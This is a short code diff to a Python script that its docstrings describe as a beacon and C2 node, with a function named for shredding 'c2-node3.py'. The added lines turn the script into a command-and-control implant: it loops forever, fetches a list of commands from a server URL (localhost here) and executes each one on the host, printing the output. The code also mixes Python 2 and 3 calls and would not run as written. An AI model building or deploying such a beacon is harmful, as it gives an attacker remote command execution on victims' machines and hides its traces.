@@ -1,15 +1,19 @@
 import json
 import os
 import time
-#import urllib.request
+import urllib.request
 
 def mainloop():
     """repeatedly beacon to server"""
-    #response = urllib.request.urlopen("http://localhost/commands.json")
-    #response_body = response.read()
-    #commands = json.loads(response_body)
-    stdout = os.system("dsfdsping google.com")
-    print(stdout)#.readline())
+    while 1:
+        response = urllib.request.urlopen("http://localhost/commands.json")
+        response_body = response.read()
+        commands = json.loads(response_body)
+
+        for cmd in commands:
+            stdin, stdout_stderr = os.popen4(cmd)
+            output = stdout_stderr.read() # wait until child process terminates
+            print(output)
 
 def shredC2():
     """shreds the file c2-node3.py"""
